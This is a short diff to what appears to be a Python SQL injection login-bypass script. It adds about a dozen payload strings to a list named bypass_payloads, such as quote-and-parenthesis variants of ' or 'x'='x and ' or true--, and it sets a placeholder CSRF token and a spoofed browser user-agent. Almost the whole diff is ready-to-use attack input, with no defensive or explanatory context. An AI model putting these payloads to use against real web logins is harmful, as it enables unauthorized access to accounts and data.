@@ -13,7 +13,21 @@ bypass_payloads = [
 "\' or \'\'*\'",
 "\"-\'",
 "\" \"",
-"\"&\""	]
+"\"&\"",
+"\" or \"\"^\"",
+"\" or \"\"*\"",
+"or true--",
+" or true--",
+"\' or true--",
+"\") or true--",
+"\') or true--",
+"\' or \'x\'=\'x",
+"\') or (\'x\')=(\'x",
+"\')) or ((\'x\'))=((\'x",
+"\" or \"x\"=\"x",
+"\") or (\"x\")=(\"x",
+"\")) or ((\"x\"))=((\"x"
+]
 
 token = "thisiswhereuputcsrftoken"
 uagent = "Mozilla/5.0 (macosx snow muppet; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
